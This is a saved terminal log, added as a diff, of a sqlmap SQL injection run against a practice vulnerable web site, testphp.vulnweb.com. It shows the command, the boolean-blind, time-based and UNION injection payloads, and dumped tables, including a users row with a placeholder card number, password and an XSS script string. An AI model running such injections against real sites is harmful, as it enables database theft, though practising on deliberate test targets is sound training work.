@@ -1,0 +1,159 @@
+┌──(zitsaman11㉿MFThree)-[~]
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --dump  >> ~/Desktop/sql_inject4.txt
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.6.7#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:29:58 /2022-11-05/
+
+[06:29:58] [INFO] resuming back-end DBMS 'mysql' 
+[06:29:58] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 7950=7950
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8503 FROM (SELECT(SLEEP(5)))WCBX)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-8128 UNION ALL SELECT NULL,CONCAT(0x7162767071,0x4e7a7263706c614355704a7264786e77684747456d58796d6269774d4c576b6d48767a6546506b6c,0x716a707a71),NULL-- -
+---
+[06:29:59] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+[06:29:59] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[06:29:59] [INFO] fetching current database
+[06:29:59] [INFO] fetching tables for database: 'acuart'
+[06:29:59] [INFO] fetching columns for table 'categ' in database 'acuart'
+[06:29:59] [INFO] fetching entries for table 'categ' in database 'acuart'
+Database: acuart
+Table: categ
+[4 entries]
++--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+
+| cat_id | cdesc                                                                                                                                                                                                                                                              | cname     |
++--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+
+| 1      | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati | Posters   |
+| 2      | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati | Paintings |
+| 3      | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati | Stickers  |
+| 4      | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenati | Graffity  |
++--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+
+
+[06:29:59] [INFO] table 'acuart.categ' dumped to CSV file '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/categ.csv'
+[06:29:59] [INFO] fetching columns for table 'pictures' in database 'acuart'
+[06:29:59] [INFO] fetching entries for table 'pictures' in database 'acuart'
+Database: acuart
+Table: pictures
+[7 entries]
++------+--------+--------+------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+--------------+-------------------------------------------------------------------------------------------------------------------------------+
+| a_id | cat_id | pic_id | img              | plong                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | price | title        | pshort                                                                                                                        |
++------+--------+--------+------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+--------------+-------------------------------------------------------------------------------------------------------------------------------+
+| 1    | 1      | 1      | ./pictures/1.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 500   | The shore    | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu.                           |
+| 1    | 1      | 2      | ./pictures/2.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 800   | Mistery      | Donec molestie.\nSed aliquam sem ut arcu.                                                                                     |
+| 1    | 1      | 3      | ./pictures/3.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 986   | The universe | Lorem ipsum dolor sit amet. Donec molestie.\nSed aliquam sem ut arcu.                                                         |
+| 1    | 1      | 4      | ./pictures/4.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 1000  | Walking      | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin.\n |
+| 1    | 1      | 5      | ./pictures/5.jpg | <p>\nThis picture is an 53 cm x 12 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p>  | 460   | Mean         | Lorem ipsum dolor sit amet, consectetuer adipiscing elit.                                                                     |
+| 1    | 2      | 6      | ./pictures/6.jpg | <p>\nThis picture is an 99 cm x 200 cm masterpiece.\n</p>\n<p>\nThis text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. \n</p> | 10000 | Thing        | Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin.\n |
+| 2    | 1      | 7      | ./pictures/7.jpg | bla bla bla long                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | 15000 | Trees        | bla bla bla                                                                                                                   |
++------+--------+--------+------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+--------------+-------------------------------------------------------------------------------------------------------------------------------+
+
+[06:29:59] [INFO] table 'acuart.pictures' dumped to CSV file '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/pictures.csv'
+[06:29:59] [INFO] fetching columns for table 'users' in database 'acuart'
+[06:29:59] [INFO] fetching entries for table 'users' in database 'acuart'
+[06:29:59] [INFO] recognized possible password hashes in column 'cart'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] do you want to crack them via a dictionary-based attack? [Y/n/q] Database: acuart
+n
+Table: users
+[1 entry]
++---------------------+----------------------------------+----------------------------------+------+-----------------+---------+-------+-----------+
+| cc                  | cart                             | name                             | pass | email           | phone   | uname | address   |
++---------------------+----------------------------------+----------------------------------+------+-----------------+---------+-------+-----------+
+| 1234-5678-2300-9000 | e20b144a8180981188f61ba751e9c3f4 | <script>alert(“hacked”)</script> | test | email@email.com | 2323345 | test  | 21 street |
++---------------------+----------------------------------+----------------------------------+------+-----------------+---------+-------+-----------+
+
+[06:30:27] [INFO] table 'acuart.users' dumped to CSV file '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'
+[06:30:27] [INFO] fetching columns for table 'artists' in database 'acuart'
+[06:30:27] [INFO] fetching entries for table 'artists' in database 'acuart'
+Database: acuart
+Table: artists
+[3 entries]
++-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+| artist_id | adesc                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | aname   |
++-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+| 1         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p> | r4w8173 |
+| 2         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>                                                         | Blad3   |
+| 3         | <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>                                                         | lyzae   |
++-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+
+[06:30:27] [INFO] table 'acuart.artists' dumped to CSV file '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/artists.csv'
+[06:30:27] [INFO] fetching columns for table 'featured' in database 'acuart'
+[06:30:27] [INFO] fetching entries for table 'featured' in database 'acuart'
+[06:30:27] [INFO] fetching number of entries for table 'featured' in database 'acuart'
+[06:30:27] [INFO] resumed: 0
+[06:30:27] [WARNING] table 'featured' in database 'acuart' appears to be empty
+Database: acuart
+Table: featured
+[0 entries]
++--------+--------------+
+| pic_id | feature_text |
++--------+--------------+
++--------+--------------+
+
+[06:30:27] [INFO] table 'acuart.featured' dumped to CSV file '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/featured.csv'
+[06:30:27] [INFO] fetching columns for table 'carts' in database 'acuart'
+[06:30:27] [INFO] fetching entries for table 'carts' in database 'acuart'
+[06:30:27] [INFO] fetching number of entries for table 'carts' in database 'acuart'
+[06:30:27] [INFO] resumed: 0
+[06:30:27] [WARNING] table 'carts' in database 'acuart' appears to be empty
+Database: acuart
+Table: carts
+[0 entries]
++---------+------+-------+
+| cart_id | item | price |
++---------+------+-------+
++---------+------+-------+
+
+[06:30:27] [INFO] table 'acuart.carts' dumped to CSV file '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/carts.csv'
+[06:30:27] [INFO] fetching columns for table 'guestbook' in database 'acuart'
+[06:30:27] [INFO] fetching entries for table 'guestbook' in database 'acuart'
+[06:30:28] [INFO] fetching number of entries for table 'guestbook' in database 'acuart'
+[06:30:28] [INFO] resumed: 0
+[06:30:28] [WARNING] table 'guestbook' in database 'acuart' appears to be empty
+Database: acuart
+Table: guestbook
+[0 entries]
++-------+--------+----------+
+| mesaj | sender | senttime |
++-------+--------+----------+
++-------+--------+----------+
+
+[06:30:28] [INFO] table 'acuart.guestbook' dumped to CSV file '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/guestbook.csv'
+[06:30:28] [INFO] fetching columns for table 'products' in database 'acuart'
+[06:30:28] [INFO] fetching entries for table 'products' in database 'acuart'
+Database: acuart
+Table: products
+[3 entries]
++----+---------------------------------------------------+-------+--------------------------------------------+--------------------------------+
+| id | name                                              | price | description                                | rewritename                    |
++----+---------------------------------------------------+-------+--------------------------------------------+--------------------------------+
+| 1  | Network Storage D-Link DNS-313 enclosure 1 x SATA | 359   | NET STORAGE ENCLOSURE SATA DNS-313 D-LINK  | network-attached-storage-dlink |
+| 2  | Web Camera A4Tech PK-335E                         | 10    | Web Camera A4Tech PK-335E                  | web-camera-a4tech              |
+| 3  | Laser Color Printer HP LaserJet M551dn, A4        | 812   | Laser Color Printer HP LaserJet M551dn, A4 | color-printer                  |
++----+---------------------------------------------------+-------+--------------------------------------------+--------------------------------+
+
+[06:30:28] [INFO] table 'acuart.products' dumped to CSV file '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/products.csv'
+[06:30:28] [INFO] fetched data logged to text files under '/home/zitsaman11/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 06:30:28 /2022-11-05/
+
